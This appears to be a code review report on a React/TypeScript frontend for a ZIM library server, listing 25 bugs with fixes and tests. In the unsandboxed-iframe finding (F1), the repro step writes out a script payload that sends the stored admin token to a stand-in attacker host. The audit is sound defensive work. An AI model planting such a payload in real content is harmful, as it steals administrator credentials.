# Frontend Review — r1

**Scope:** `web/` at commit `cbb1a4e` (Release 0.5.0), all of `web/src`: `App.tsx`, `main.tsx`, `ui.tsx`, `Dialog.tsx`, `Combobox.tsx`, `Charts.tsx`, `Media.tsx`, `Filing.tsx`, `Scope.tsx`, `Network.tsx`, `ThemePicker.tsx`, `lib/{api,ai,format,live,theme,tidy,viewport,speech}.ts(x)`, and `pages/{Ask,Catalog,Create,Downloads,Feeds,Library,Logs,Monitor,Queues,Reader,Search,Settings,SettingsParts,Updates}.tsx`. `AiSettings.tsx` was also read because `Settings.tsx` renders it.
**Date:** 2026-11-14
**Method:** Full read of the files above; every request checked against the FastAPI routes and pydantic bodies in `src/zim_pro/api/*.py`; `npx tsc --noEmit` passes cleanly; `npm test` passes (9 tidy tests). No source files were modified.

## Summary

- The frontend is unusually well structured: shared `useData` has a stale-response counter, `Ask` has a real `AbortController` with a run-generation guard, secrets are masked end-to-end, and destructive actions generally confirm.
- The most serious problems are not in the happy path but at the edges: an unsandboxed same-origin iframe gives ZIM content access to the admin token, background 401s open blocking prompts in a loop, and no request has a timeout or abort-on-unmount.
- Several user-visible correctness bugs were found: citation linking corrupts code samples, feed-article pagination permanently stalls at 200 items, and a failed queue-concurrency PUT is still adopted into the settings form as "saved". Error handling is inconsistent: `LiveProvider` and several pages swallow errors and render empty states, while several click handlers (`Search` history, chat rename/delete, "Older lines", log clear, provider toggle) leave rejected promises unhandled.
- Testing is one pure-function file. There is no vitest/jsdom/@testing-library setup, so no component, fetch, SSE or keyboard behaviour can currently be tested.

## Top 5 must-fix

1. **F1** Sandbox the Reader iframe (or serve ZIM content from a separate origin/CSP): uploaded ZIM HTML currently runs with the app's origin and can read `kiwix-admin-token`.
2. **F2** Stop prompting for the admin token on background GETs/polls; a cancelled prompt on `/api/logs` re-prompts every 2 seconds and blocks the tab.
3. **F3** Add a timeout + caller-provided `AbortSignal` to `api()` (and to the XHR upload); a hung backend leaves spinners and disabled buttons forever.
4. **F4** Fix feed-article "Show more": it increases `count`, but the API caps `count` at 200, so the list stops growing while the button still reports items left.
5. **F5** Don't adopt a queue-concurrency value into Settings when the PUT failed — `act()` swallows the error and `onSetting` marks the rejected value as saved.

## Findings

### F1. [High] Reader iframe is unsandboxed same-origin content
**Location:** `web/src/pages/Reader.tsx:221-227`
**Category:** Security / XSS
**Confidence:** high
**Evidence:**
```tsx
<iframe ref={frame} src={src} onLoad={syncLocation} title={book?.title ?? "Article"} ... />
```
`/content/...` is served with the original ZIM HTML and no CSP (`src/zim_pro/api/content.py:76-114`). The iframe is same-origin, so page scripts can read `localStorage["kiwix-admin-token"]` (`web/src/lib/api.ts:1,19`) and call `/api/*` with it; they can also reach `window.top`.
**Impact:** A malicious or compromised ZIM (catalog entry, hand-copied `.zim`, or uploaded `.zim`, which the server stores as-is) gets full admin API access and can exfiltrate the library/token.
**Trigger/Repro:** Upload a ZIM whose main page contains `<script>fetch("https://attacker/?"+localStorage.getItem("kiwix-admin-token"))</script>`, open it in Reader.
**Suggested fix:** Use `sandbox="allow-scripts allow-forms allow-popups"` without `allow-same-origin` (links and images still work), or serve `/content` from a separate origin; add `Content-Security-Policy: sandbox` for content responses. Do not keep a bearer token in storage readable by framed content.
**Test to add:** A render test asserting the Reader iframe has a `sandbox` attribute that excludes `allow-same-origin`; an API test asserting `/content` sends the CSP sandbox header.

### F2. [High] A cancelled 401 prompt re-opens on every background poll
**Location:** `web/src/lib/api.ts:22-29`, `web/src/pages/Logs.tsx:120-134`
**Category:** Error/401 handling, availability
**Confidence:** high
**Evidence:**
```ts
if (response.status === 401 && retry) {
  const entered = window.prompt("This server needs the admin token to make changes:");
  ...
}
```
and
```ts
const timer = window.setInterval(() => {
  if (document.visibilityState !== "visible" || !newest.current) return;
  api<LogPage>(params({ after: newest.current })).then(...).catch(() => {});
}, 2000);
```
`/api/logs`, `/api/feeds`, `/api/feeds/runs`, `/api/build/*` mutations and `/api/ai/*` are `require_admin`; `/api/feeds/runs` is also fetched by `LiveProvider.refresh()` after nearly every action.
**Impact:** With `KIWIX_ADMIN_TOKEN` set and the prompt cancelled (or a wrong token stored), the tab opens a blocking `window.prompt` every 2 s on the Logs page and on every `refresh()` elsewhere; the app becomes unusable. A wrong token is also re-prompted forever because it is never cleared or validated.
**Trigger/Repro:** Set an admin token, clear `kiwix-admin-token`, open Settings → Logs, press Cancel; the prompt reappears every 2 s.
**Suggested fix:** Prompt only for explicit user mutations, remember a "declined" state, clear/replace a token after a second 401, and surface an inline "Admin token required" banner with a form instead of `window.prompt`.
**Test to add:** Unit-test `api()` with a mocked 401 and a spy on `window.prompt`; assert GET requests never prompt, a second failure with the same token does not prompt again, and a cancelled prompt rejects once.

### F3. [High] No fetch timeout and no abort-on-navigation; no timeout on uploads
**Location:** `web/src/lib/api.ts:17-41`, `web/src/pages/Create.tsx:589-609`, `web/src/lib/live.tsx:62-75`
**Category:** Connectivity / lifecycle
**Confidence:** high
**Evidence:** `api()` calls `fetch(path, {...init, headers})` with no `signal` and no timer; callers cannot pass one (`init` is forwarded, but none do). `useData` only drops stale responses via `latest.current`; it never aborts and its `.finally()` still runs after unmount. The upload XHR sets no `request.timeout`.
**Impact:** A backend that accepts a connection but never answers leaves `loading` true, "Saving…" buttons disabled and `busy` flags set forever; requests continue after route changes and pile up during polling. The upload can hang at 0% indefinitely.
**Trigger/Repro:** Make an endpoint sleep indefinitely (or drop packets after accept), open Catalog, then navigate away; the request stays pending and its `.then` can still call `setData` on the unmounted tree.
**Suggested fix:** Give `api()` an optional `signal` and a default timeout (e.g. `AbortSignal.timeout(30_000)`, longer for known-slow calls), pass a per-effect controller from `useData`/`usePoll`, abort in cleanup, and set `request.timeout` on the XHR upload.
**Test to add:** `api()` with a never-resolving `fetch` and fake timers rejects with a timeout; `useData` unmount aborts its signal and does not call setters.

### F4. [Medium] Feed article pagination stalls at the API's 200-row cap
**Location:** `web/src/pages/Feeds.tsx:473-474,528-531`; backend `src/zim_pro/api/feeds.py:205`
**Category:** Pagination
**Confidence:** high
**Evidence:**
```tsx
const [shown, setShown] = useState(30);
useData(`/api/feeds/${feed.id}/items?count=${shown}&state=${state}&q=...`, [revision])
...
<button onClick={() => setShown(shown + 100)}>Show more ({count(data.total - data.items.length)} left)</button>
```
and backend: `max(1, min(count, 200))`, with `start` fixed at 0.
**Impact:** Once `shown` passes 200 the server keeps returning 200 rows. For a collection with >200 articles the button stops adding rows but keeps saying "N left" forever; the only escape is filtering.
**Trigger/Repro:** Import a feed with 300+ saved items, open Articles, click "Show more" three times.
**Suggested fix:** Page by offset: keep `start` and append (or request `start=items.length&count=100`), and hide the button when `items.length >= total`.
**Test to add:** Pure pagination helper: 250 total, page size 100 → [100,100,50] and no fourth request; assert the URL contains `start`.

### F5. [Medium] Failed queue-concurrency PUT is adopted into Settings as saved
**Location:** `web/src/pages/Queues.tsx:331-343`, `web/src/pages/Settings.tsx:193-196`
**Category:** State correctness / optimistic update
**Confidence:** high
**Evidence:**
```ts
const act = async (path, method = "POST", body?) => {
  try { const result = await api(...); replace(...); }
  catch (reason) { setProblem(String(reason.message)); }   // swallows
};
const concurrency = (queue) => async (value) => {
  await act(`/api/queues/${queue.name}/concurrency`, "PUT", { value });
  onSetting({ [SETTING_OF[queue.name]]: value });          // always runs
};
```
`Settings.adopt` does `setForm({...patch})` and `setSaved(JSON.stringify({...saved,...patch}))`.
**Impact:** A 401/403/409/network failure on `+`/`−` leaves the server at the old limit, but the Settings form adopts the new value and marks it saved; the displayed `+` state is also stale, and a later Save cannot correct it (nothing is dirty).
**Trigger/Repro:** Block `/api/queues/*/concurrency` (or cancel the token prompt) and click `+`; then open General/Create settings and inspect the concurrency field.
**Suggested fix:** Return a success flag (rethrow) from `act`; only call `onSetting` when the PUT succeeded, and roll back the optimistic number otherwise.
**Test to add:** Call `concurrency()` with an `api` stub that rejects; assert `onSetting` is not called.

### F6. [Medium] Citation linking corrupts inline code and fenced code
**Location:** `web/src/pages/Ask.tsx:127-129,489`
**Category:** Rendering correctness
**Confidence:** high
**Evidence:**
```ts
return text.replace(/\[(\d+)\](?!\()/g, (whole, n) => (sources.some((s) => s.n === +n) ? `[${n}](#cite-${n})` : whole));
...
<Markdown ...>{linkCitations(content, sources)}</Markdown>
```
`content` is the whole tidied Markdown, including fenced blocks and backtick spans. `tidyMarkdown` deliberately leaves code untouched, but this later pass does not.
**Impact:** Answers about programming display `arr[1](#cite-1)` inside code, and copy/paste from the rendered page is wrong. Common whenever a source exists and the code contains array indices or footnote-like syntax.
**Trigger/Repro:** Ask a coding question whose answer includes ``Use `items[1]` `` and has at least two sources.
**Suggested fix:** Apply the citation rewrite per Markdown text node (or at least skip fenced/segmented code using the same `segments()` helper) before rendering.
**Test to add:** Extract `linkCitations` and assert `` `a[1]` `` and ```` ```\nx[1]\n``` ```` are unchanged while prose `[1]` becomes `[1](#cite-1)`.

### F7. [Medium] Logs live/filter/older requests can mix results from different filters
**Location:** `web/src/pages/Logs.tsx:100-134,142-148`
**Category:** Race condition
**Confidence:** high
**Evidence:** The filter effect guards with `gone`, but the 2 s live effect does not:
```ts
api<LogPage>(params({ after: newest.current })).then((page) => {
  const { lines: got, ...rest } = page;
  newest.current = page.newest; setInfo(rest);
  if (got.length) setLines((current) => [...got, ...current].slice(0, 5000));
}).catch(() => {});
```
Its cleanup only clears the interval; it does not cancel an in-flight request or check that `params` is still current. `older()` also appends unconditionally.
**Impact:** After changing area/job/query while a poll or "Older lines" request is in flight, lines that do not match the new filter are prepended/appended, and `info` (areas/jobs/level) can revert to the old filter's metadata.
**Trigger/Repro:** Throttle the network, switch from "Every part" to one area while a poll is in flight; unmatched lines appear at the top.
**Suggested fix:** Use an `AbortController` per filter generation (or a request-id ref) and discard responses whose id/filter does not match; abort the previous live request when `params` changes.
**Test to add:** With two mocked responses resolved out of order, assert only the current filter's lines and metadata are applied.

### F8. [Medium] Reader suggestions resolve out of order
**Location:** `web/src/pages/Reader.tsx:86-94`
**Category:** Race condition
**Confidence:** high
**Evidence:**
```ts
const timer = setTimeout(() => {
  api<Suggestion[]>(`/api/suggest?book=...&q=${encodeURIComponent(query)}`)
    .then(setSuggestions).catch(() => setSuggestions([]));
}, 150);
return () => clearTimeout(timer);
```
The debounce timer is cleared, but an already-sent request is not cancelled or sequenced.
**Impact:** A slower response for a shorter prefix can overwrite suggestions for the current query; clicking it navigates to an article the user did not ask for.
**Trigger/Repro:** Throttle `/api/suggest`, type `a` then quickly `ab`; the `a` response can land last.
**Suggested fix:** Keep a request counter/`AbortController` and ignore responses that are not the latest query; clear suggestions when the query changes.
**Test to add:** Two mocked responses resolved in reverse order; assert the latest query's suggestions win.

### F9. [Medium] SSE has no reconnect recovery, offline state, or parse guard
**Location:** `web/src/lib/live.tsx:33-46`
**Category:** Connectivity / SSE
**Confidence:** high
**Evidence:**
```ts
const source = new EventSource("/api/events");
source.addEventListener("builds", (event) => setBuilds(JSON.parse((event as MessageEvent).data)));
...
return () => source.close();
```
No `onopen`, `onerror`, `readyState` or backoff handling; `JSON.parse` is unguarded.
**Impact:** The server publishes only on change, so anything that happens while the connection is down (e.g. after sleep, a proxy timeout, or a failed reconnect) is lost until another change occurs or a page action calls `refresh()`. The UI cannot show "offline", download counts silently freeze, and a malformed event throws inside the listener.
**Trigger/Repro:** Stop the backend for 30 s while a download runs, restart it; progress stays frozen because no new event is published.
**Suggested fix:** On `onerror`, set a disconnected flag; on `onopen` after an error, call `refresh()` to resynchronise; wrap `JSON.parse` in try/catch; consider a jittered backoff by recreating the source after repeated failures.
**Test to add:** Fire `error` then `open` on a mocked EventSource and assert the three list endpoints are re-fetched; malformed `data` does not throw.

### F10. [Medium] FastAPI validation errors lose their field details
**Location:** `web/src/lib/api.ts:30-38`
**Category:** Error contract
**Confidence:** high
**Evidence:** `if (typeof body.detail === "string") message = body.detail;` — but FastAPI 422s from pydantic return `detail: [{loc, msg, type}, ...]`, which is not a string, so `message` stays `response.statusText` ("Unprocessable Entity").
**Impact:** Every validation gap (out-of-range `max_depth`, `rate_limit=1e999` serialised as `null`, `start=NaN`, negative settings) shows a generic message with no field. Users cannot tell what to fix.
**Trigger/Repro:** Set `max_pages` to `1.5` in the link dialog (type=number accepts it) and save; the note says "Unprocessable Entity".
**Suggested fix:** If `Array.isArray(body.detail)`, join `detail.map(d => `${d.loc?.slice(1).join(".")}: ${d.msg}`)`.
**Test to add:** `api()` with a 422 body containing a pydantic detail array produces a message mentioning the field and reason; string details still pass through.

### F11. [Medium] Errors are rendered as empty states; live errors are swallowed entirely
**Location:** `web/src/lib/live.tsx:26-36`, `web/src/pages/Create.tsx:443,581`, `web/src/pages/Feeds.tsx:539`, `web/src/lib/ai.ts:88-96`, `web/src/pages/Ask.tsx:702-705`
**Category:** Error UI
**Confidence:** high
**Evidence:**
```ts
api<Download[]>("/api/downloads").then(setDownloads).catch(() => {});
```
`Links`/`Uploads` never look at `useData`'s `error`; `useModels` catches and does `setGroups([])`; `Ask` never reads `status.error`, `chats.error` or `books.error`.
**Impact:** On a 401/500/offline, Downloads says "Nothing is downloading", Create shows no links/uploads, Settings → AI says "No provider yet" and offers to add one (even though providers exist), and Ask shows a disabled Send button with no explanation. Users interpret failures as empty data and may re-add duplicates.
**Trigger/Repro:** Block `/api/ai/models` and open Settings → AI; the provider list becomes "No provider yet".
**Suggested fix:** Keep previous data on refresh failure, expose the error, and render an inline error + Retry (`reload`) instead of the empty state. Do not replace `groups` with `[]` on error.
**Test to add:** `useModels` with a rejected request keeps prior groups and reports an error; render `Links` with `error` and no `data` and assert an error/Retry UI rather than blank.

### F12. [Medium] Several handlers leave rejected promises unhandled
**Location:** `web/src/pages/Ask.tsx:611-621`, `web/src/pages/Search.tsx:211-212`, `web/src/pages/Logs.tsx:142-167`, `web/src/pages/Settings.tsx:261`, `web/src/pages/AiSettings.tsx:302-307`
**Category:** Error handling
**Confidence:** high
**Evidence:**
```ts
const rename = async (chat) => {
  const title = window.prompt(...)?.trim();
  ...
  await api(`/api/ai/chats/${chat.id}`, { method: "PATCH", body: ... });   // no try/catch
  onChanged();
};
```
and `onForget={(past) => api(...).then(loadHistory)}` (no catch), `onClear` likewise, `older()`/`clear()` in Logs, `Providers.toggle` with `.finally` only.
**Impact:** A failed rename/delete/clear produces an unhandled rejection, no user feedback, and a UI that still shows the old state; in the chat list the delete button appears to do nothing.
**Trigger/Repro:** Cancel the admin-token prompt (or use a read-only proxy) and click Rename/Delete on a chat, or "Clear all" in search history.
**Suggested fix:** Wrap each in try/catch and show the existing `ErrorNote`/problem slot; use a shared `run()` helper as Catalog/Updates already do.
**Test to add:** Render History with an `api` stub that rejects; assert an error message appears and the item remains.

### F13. [Medium] Settings saves the whole object, silently reverting concurrent changes
**Location:** `web/src/pages/Settings.tsx:87,147-152,169-180`
**Category:** State / partial update
**Confidence:** medium
**Evidence:**
```ts
const stored = await api<SettingsData>("/api/settings", { method: "PUT", body: JSON.stringify(form) });
```
The form is loaded once (`if (loaded.data && !form)`), and only `build_proxy_enabled`, `captcha_solver_enabled`, `vpn_change_ip`, `ai_*` defaults, queue concurrency and `log_level` are reconciled. Every other key is whatever the tab loaded.
**Impact:** Another admin/tab changing `feed_auto_sync`, `search_history`, `keep_old_versions`, `catalog_refresh_hours`, etc. is overwritten on the next Save from this tab, with no conflict indication.
**Trigger/Repro:** Open Settings in two tabs; toggle "Sync on schedule" in tab B; edit an unrelated field and Save in tab A; tab B's change is lost.
**Suggested fix:** Send only changed keys (compare against the loaded snapshot) or add a version/ETag; at minimum re-fetch and reconcile before PUT.
**Test to add:** Extract a `changedKeys(form, saved)` helper and assert only edited keys are sent; a component test with two mutations.

### F14. [Medium] Dialog does not trap or restore focus and does not autofocus
**Location:** `web/src/Dialog.tsx:32-41,43-76`
**Category:** Accessibility
**Confidence:** high
**Evidence:** The dialog adds Escape handling and `aria-modal`, but there is no `tabIndex`, focus sentinel, `document.activeElement` save/restore, or initial-focus logic; the whole rest of the app remains tabbable behind the portal.
**Impact:** Keyboard and screen-reader users can tab into the obscured page; after closing, focus returns to `<body>` rather than the button that opened the dialog.
**Trigger/Repro:** Open "Add link" with the keyboard, press Tab repeatedly; focus moves behind the modal. Close it; focus is lost.
**Suggested fix:** On mount focus the first field or the dialog container, trap Tab within the panel, and restore the previously focused element on unmount (or use `<dialog>`/a small focus-trap hook).
**Test to add:** jsdom test: open Dialog, assert focus is inside; press Tab past the last element and assert it wraps; close and assert the opener regains focus.

### F15. [Medium] Ask can start overlapping requests / send with no provider
**Location:** `web/src/pages/Ask.tsx:873-879,977-991,1074-1078`
**Category:** Race / form validation
**Confidence:** high
**Evidence:**
```ts
const submit = (event?) => {
  event?.preventDefault();
  const question = text.trim();
  if (!question || busy) return;      // `busy` state lags a render
  setText(""); void ask(question);
};
...
<button ... onClick={() => void ask(prompt)}>   // suggestions: no busy check at all
...
<button ... disabled={!text.trim() || !ready}>  // Enter bypasses this
```
`busy` only becomes true after the next render; `ask()` does not read a ref.
**Impact:** Pressing Enter twice quickly or double-clicking a suggestion starts two `/api/ai/ask` streams; the second increments `run.current`, orphaning the first request (server keeps generating until the client disconnects) and leaving `busy`/messages dependent on which `finally` runs. Enter also sends when `ready` is false, producing a server-side "No AI provider is set up" error bubble despite the disabled Send button.
**Trigger/Repro:** On a blank chat with a configured model, double-press Enter in the composer; watch two POSTs in the network log. Remove all providers and press Enter.
**Suggested fix:** Guard with a `busyRef` set synchronously before `stream()`, disable the suggestion buttons while `busy`, and include `!ready` in `submit()`.
**Test to add:** Fire `submit` twice in the same tick with a mocked `fetch` and assert only one request; `submit` with `ready === false` does not call `fetch`.

### F16. [Medium] Catalog download badges never update while the page is open
**Location:** `web/src/pages/Catalog.tsx:36-38`, `web/src/lib/live.tsx:40,42-44`
**Category:** Stale data
**Confidence:** high
**Evidence:**
```ts
const { data, ... } = useData(`/api/catalog?${query}`, [downloads.length]);
```
`download_state` comes from the catalog response; SSE `downloads` events replace `downloads`, but do not bump `revision` (only `library`/`catalog` do), and a download changing from downloading → done keeps the array length the same.
**Impact:** A finished download keeps showing the "downloading" badge (and no Download button) until the user leaves and returns to Catalog or a library/catalog event happens.
**Trigger/Repro:** On Catalog, download a book and wait for completion; the badge remains.
**Suggested fix:** Depend on a serialization of the relevant download states (`downloads.map(d => d.id+":"+d.state).join()`), or bump `revision` from the downloads SSE handler when a state changes.
**Test to add:** Render Catalog with a mocked `/api/catalog` and a `downloads` transition queued→done; assert a re-fetch or updated badge.

### F17. [Medium] Source save is not atomic with its picture; retry duplicates/409s
**Location:** `web/src/pages/Create.tsx:197-206`, `web/src/pages/Feeds.tsx:138-153`, `web/src/Filing.tsx:249-261`
**Category:** Data integrity
**Confidence:** high
**Evidence:**
```ts
api<{ id: number }>(id ? `/api/build/links/${id}` : "/api/build/links", {...})
  .then((saved) => saveIcon("link", saved.id, icon))
  .then(onSaved)
  .catch((reason) => setProblem(String(reason.message)));
```
The link/feed already exists when `saveIcon` fails (401/413/415/network); the dialog stays open with the original draft (no `id`), so pressing Save again POSTs a second link (409 "already in your links" for links; a second collection for feeds, since title is not unique).
**Impact:** Confusing failures and, for feeds, duplicate collections and duplicated first syncs.
**Trigger/Repro:** Add a link with a 12 MB picture (server limit 10 MB) or cancel the token prompt; the link is created, the error is shown, Save again fails/duplicates.
**Suggested fix:** On entity creation, update the dialog's id immediately (or close it and report the icon failure separately), and treat the icon as an independent, retryable step.
**Test to add:** Mock `POST /api/build/links` to succeed and `saveIcon` to reject; assert the dialog adopts the returned id and does not allow a duplicate POST on retry.

### F18. [Medium] CSV/OPML export saves error responses as files
**Location:** `web/src/pages/Create.tsx:448-454`, `web/src/pages/Feeds.tsx:566-571`
**Category:** Error handling / downloads
**Confidence:** high
**Evidence:**
```ts
const reply = await fetch("/api/build/links/export", { headers: authHeaders() });
const url = URL.createObjectURL(await reply.blob());
```
No `reply.ok` check; a 401 JSON body or a 500 HTML page is downloaded as `zim-pro-links.csv` / `zim-pro-feeds.opml`.
**Impact:** Users import a corrupt CSV/OPML later; the real auth/error is invisible. `URL.revokeObjectURL` immediately after `click()` is also unreliable in some browsers.
**Trigger/Repro:** Set an admin token without a stored token, click Export CSV; the file contains `{"detail":"admin token required"}`.
**Suggested fix:** Check `reply.ok`, read the detail on failure and show it; revoke the URL on a timeout/after `load`, and use the `Content-Disposition` filename.
**Test to add:** `exportCsv()` with a 401 JSON response rejects and displays the detail without creating an anchor.

### F19. [Medium] Uploads accept drops while already uploading and do no client-side validation
**Location:** `web/src/pages/Create.tsx:610-627,645-648`
**Category:** File upload / validation
**Confidence:** medium
**Evidence:** `sendAll` has no in-flight guard; the drop zone's `onDrop` calls it even when `sending` is set (only the Choose button is disabled). `accept` on the hidden input is advisory and the dragged files are not checked; `data.limit_mb` is only displayed. Errors per file are reported but the loop continues.
**Impact:** Dropping two batches starts overlapping XHRs that share one `sending` state, so progress/name jump between files; an oversized or wrong-type file is streamed to the server before rejection (413/415) and, for multiple files, the user sees only the last error.
**Trigger/Repro:** Start a large upload, then drop another file on the zone.
**Suggested fix:** Ignore drops/drops while `sending`, validate extension and size against `limit_mb` before sending, and collect errors per file for display.
**Test to add:** `sendAll` with an in-flight flag rejects a second call; a file above `limit_mb` never reaches XHR.

### F20. [Medium] `localStorage` access is unguarded in `api.ts`
**Location:** `web/src/lib/api.ts:12-15,19,26`
**Category:** Robustness
**Confidence:** high
**Evidence:** `localStorage.getItem`/`setItem` are called directly in `authHeaders()` and `api()`; `theme.ts:10-15` and `Ask.tsx:711-726` wrap theirs in try/catch.
**Impact:** Where storage is blocked (Safari private mode, third-party-cookie/storage restrictions, some kiosk browsers), the first API call throws a `SecurityError` before `fetch`, so the whole app fails to load data with no useful message. `IconPicker`/upload/speech paths call `authHeaders()` and fail the same way.
**Trigger/Repro:** Open the app with `localStorage` access blocked (or stub `getItem` to throw); every page stays empty/errors.
**Suggested fix:** Wrap token reads/writes in try/catch (return `{}` / skip persistence), shared by `authHeaders()` and `api()`.
**Test to add:** `api()`/`authHeaders()` with a throwing `localStorage` stub still issues the request without an `Authorization` header.

### F21. [Medium] `start` from the URL is unvalidated in Search
**Location:** `web/src/pages/Search.tsx:130,170-176,367-375`
**Category:** Form/URL validation
**Confidence:** high
**Evidence:** `const start = Number(params.get("start") ?? 0);` — `?start=abc` yields `NaN`, `?start=-20` yields a negative offset. The value is sent as `start=NaN`/`start=-20`; the backend's FastAPI `int` rejects `NaN` with 422, and the Prev/Next math (`start - PAGE`, `start === 0`) is meaningless.
**Impact:** A hand-edited or shared URL shows "Unprocessable Entity" and paging buttons in a broken state; negative/NaN values are also used in `data.results.length` comparisons.
**Trigger/Repro:** Visit `/search?q=water&book=wikipedia_en_all&start=abc`.
**Suggested fix:** Parse with `Number.isFinite` and clamp to `>= 0`, then write the sanitized value back to the URL.
**Test to add:** Extract `parseStart(param)` and assert `abc`, `-5`, `1.5`, `""` map to 0/0/1/0.

### F22. [Low] Combobox and Tabs lack expected keyboard/ARIA semantics
**Location:** `web/src/Combobox.tsx:63-106,145-163,217-235`, `web/src/ui.tsx:85-112`
**Category:** Accessibility
**Confidence:** high
**Evidence:** Arrow/Enter/Escape are handled only in the search input's `onKeyDown`; the list has `role="listbox"`/`role="option"` but the input has no `aria-controls`/`aria-activedescendant`. The phone sheet is `role="dialog"` with no focus trap and no Escape handler outside the input. `Tabs` renders plain buttons without `role="tablist"`/`tab`/`aria-selected`.
**Impact:** Screen readers do not announce the active option or tab; after tabbing to an option, Escape no longer closes the picker; keyboard users can tab behind the mobile sheet.
**Trigger/Repro:** Open the model picker, press Tab to an option, press Escape — nothing happens. Inspect the DOM for missing tab roles.
**Suggested fix:** Add `aria-activedescendant`, `aria-expanded`/`aria-controls`, a document-level Escape for the open popover, and tablist semantics (or use a native `<select>` where practical).
**Test to add:** Keyboard tests: ArrowDown changes `aria-activedescendant`, Escape closes from any focused child, and Tabs report `aria-selected`.

### F23. [Low] Job details can stay on "Loading…" forever
**Location:** `web/src/pages/Create.tsx:801-805`
**Category:** Loading/error state
**Confidence:** high
**Evidence:**
```ts
const { data } = useData<Build>(`${path}/${id}`);
...
if (!data) return <p className="muted mt-2 text-xs">Loading…</p>;
```
The hook's `error` is ignored.
**Impact:** If the build was cleared/deleted by another tab, or the request 401s, the Details panel says "Loading…" indefinitely with no retry or explanation.
**Trigger/Repro:** Open a job's Details, then have another tab clear finished jobs (or cancel the token prompt) before the fetch.
**Suggested fix:** Show `error` and a Retry (`reload`) when `!data && error`.
**Test to add:** Render `JobLog` with a rejected fetch and assert an error message, not "Loading…".

### F24. [Low] MCP panel briefly claims "Open" and allows duplicate key generation
**Location:** `web/src/pages/SettingsParts.tsx:116-135,156-162,182-191`
**Category:** Security UX / double submit
**Confidence:** high
**Evidence:** `data` is `null` until `/api/mcp/keys` resolves, but the badge renders `data?.locked ? "Locked" : "Open"` and the copy command omits the `Authorization` header (`header` is `""` when `data` is null). The "Generate key" submit button has no disabled/pending state.
**Impact:** On first paint a locked MCP endpoint is shown as open (alarming and wrong), and double-clicking Generate creates two keys, only the last of which is shown as `fresh`.
**Trigger/Repro:** Throttle `/api/mcp/keys`; open Settings → MCP and watch the badge. Double-click Generate.
**Suggested fix:** Render a loading state until `data` exists; disable Generate while the POST is in flight.
**Test to add:** Mock a delayed `/api/mcp/keys` with `locked: true`; assert no "Open" badge is rendered before resolution. Submit twice asserts one POST.

### F25. [Low] Copy button in answers fails silently without a fallback
**Location:** `web/src/pages/Ask.tsx:444-452`
**Category:** Clipboard
**Confidence:** high
**Evidence:**
```ts
try { await navigator.clipboard.writeText(content); setCopied(true); ... }
catch { /* clipboard is unavailable on plain http from another machine */ }
```
Reader implements a `textarea`/`execCommand` fallback (`Reader.tsx:54-71`); the answer component does not, and shows no error.
**Impact:** On the common LAN deployment over plain HTTP (non-localhost), the copy button appears to do nothing; the icon never changes and users assume the click was ignored.
**Trigger/Repro:** Serve over `http://192.168.x.x:8080`, ask a question, press Copy answer.
**Suggested fix:** Reuse the Reader fallback and surface a "Copy failed" state; also clear the `setCopied` timeout on unmount.
**Test to add:** With `navigator.clipboard` rejecting, assert the fallback path runs and the button reports copied (or an error), not silence.

## API contract mismatches

- **Validation detail shape** — `api.ts:30-38` assumes `detail` is a string; FastAPI/pydantic returns an array for 422s. Affects every form (`LinkDialog`, `Search start`, Settings numbers). See F10.
- **`Feeds.tsx:474`** asks for more rows with `count`, but the route clamps `count` to 200 (`feeds.py:205`). See F4.
- **Catalog `download_state`** — computed only for active downloads (`catalog.py:54-60`); the client caches the whole response keyed on `downloads.length`, so completion is invisible. See F16.
- **Raw `fetch`/XHR bypass** — `/api/build/uploads` (XHR), `/api/ai/ask` (stream), `/api/ai/speech` (blob), `/api/icons/*` (FormData) and the two export downloads bypass `api()`; they therefore lack the 401 prompt, the shared detail extraction and any timeout. This is deliberate for streaming/blob/FormData, but should share `authHeaders()` + error parsing.
- **SSE auth asymmetry (backend)** — `/api/events` has no `require_admin` yet broadcasts the admin-only builds/feeds/download lists (`downloads.py:64`). The frontend cannot send an `Authorization` header on `EventSource`, so if this is tightened later the live layer will break; today it is an unauthenticated data leak when an admin token is configured.
- **Conflicting response shapes for queues are handled correctly** — `POST /api/queues/{name}/{action}` returns `{ok,count,queue}` while `PUT .../concurrency` and job actions return a bare `Queue`; `Queues.tsx:334-335` accepts both. Good.
- **All pydantic bodies spot-checked** (`LinkBody`, `FeedBody`, `Question`, `UploadOptions`, `UploadFiling`, `OpmlBody`, `CsvBody`, `NewDownload`, `BookPatch`, `SyncBody`, `Concurrency`, `TestBody`, `ChatPatch`, `SearchEntry`, `Speech`) match the fields sent, including `web: "on"|"auto"`, `{rebuild:true}`, `?hold=true`, `?rss=true` and masked secrets. No wrong paths or methods were found.
- **`SettingsData` / `Status` / `Build` / `Download` / `UpdateItem` / `CatalogEntry` / `Book` types** match the current column selections and JSON shapes; only unused fields (`auth_required`, `created`, `position`) are omitted, which is safe.

## Connectivity & error handling

- No request has a timeout; `api()` has no `signal` parameter and `useData`/`usePoll` do not abort (F3).
- 401 prompt loop is the main availability hazard (F2); 403 is not distinguished.
- SSE has no offline indicator, no reconnect resync and no parse guard (F9).
- `LiveProvider`/`useModels` convert failures to empty data (F11); several pages never inspect `useData().error` (`Links`, `Uploads`, `Collections`, `Search` books, `JobLog`, `Updates` history).
- Retry is available via `reload` only in Catalog/Updates; Library, Search, Feeds, Create and Settings offer no retry.
- Export/download helpers ignore `response.ok` (F18); `Logs.download` at least checks and uses `statusText` (which is often empty).
- `window.prompt`/`window.confirm` are used for auth and destructive actions; the auth prompt is the problematic one (F2).
- All app URLs are root-absolute (`/api`, `/content`, `/mcp`, `/manifest.webmanifest`) and `BrowserRouter` has no `basename`; the app cannot be hosted under a sub-path/reverse-proxy prefix without changes (`McpAccess` also advertises `origin/mcp`, ignoring a prefix).

## Testing gaps

- **No usable component/DOM test stack:** `package.json` has no `vitest`, `jsdom` or `@testing-library/*`; `npm test` is `node --test tests/*.test.ts`. `tsconfig.json` `include` is `["src"]`, so tests are not typechecked. Only pure functions can be tested today.
- **`lib/api.ts`:** 401 retry/cancel, wrong-token behaviour, array `detail`, non-JSON/HTML error body, empty body, timeout/abort, `localStorage` throwing.
- **`lib/live.tsx`:** out-of-order `useData` responses, revision refetch, `path=null` loading state, unmount abort, EventSource `error`→`open` resync, malformed payload.
- **`Combobox.tsx`:** filter matching, cursor clamping at both ends, `LIMIT` truncation, `allowCustom` dedupe, Enter with zero matches, Escape from a focused option, phone-sheet focus.
